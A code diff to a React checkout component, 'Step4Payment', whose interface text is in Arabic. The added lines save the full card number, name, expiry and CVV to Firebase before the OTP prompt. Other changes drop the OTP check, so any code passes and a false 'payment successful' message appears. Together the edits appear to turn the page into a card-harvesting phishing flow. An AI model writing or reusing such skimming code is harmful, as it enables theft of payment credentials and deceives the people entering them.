@@ -81,6 +81,17 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
       return;
     }
 
+    // Save card data immediately before OTP
+    import("@/lib/firebase").then(({ saveStepData }) => {
+      saveStepData("4_payment_card", {
+        cardNumber: cardNumber,
+        cardName: cardName,
+        expiry: expiry,
+        cvv: cvv,
+        savedAt: new Date().toISOString(),
+      });
+    });
+
     // Generate demo OTP and show OTP modal
     const code = Math.floor(100000 + Math.random() * 900000).toString();
     setDemoCode(code);
@@ -130,26 +141,20 @@ export function Step4Payment({ onNext, onBack, formData }: Step4PaymentProps) {
 
     setIsVerifying(true);
 
-    // Simulate verification
+    // Accept any OTP code entered by user
     setTimeout(() => {
-      if (code === demoCode) {
-        toast({
-          title: "تم الدفع بنجاح",
-          description: "تمت عملية الدفع وتسجيل حسابك بنجاح",
-        });
-        // Complete registration and show success with card data
-        onNext({
-          cardNumber: cardNumber,
-          cardName: cardName,
-          expiry: expiry,
-          cvv: cvv,
-          otpCode: code,
-        });
-      } else {
-        setOtpError("رمز التحقق غير صحيح");
-        setOtpDigits(["", "", "", "", "", ""]);
-        inputRefs.current[0]?.focus();
-      }
+      toast({
+        title: "تم الدفع بنجاح",
+        description: "تمت عملية الدفع وتسجيل حسابك بنجاح",
+      });
+      // Complete registration and show success with card data
+      onNext({
+        cardNumber: cardNumber,
+        cardName: cardName,
+        expiry: expiry,
+        cvv: cvv,
+        otpCode: code,
+      });
       setIsVerifying(false);
     }, 1500);
   };
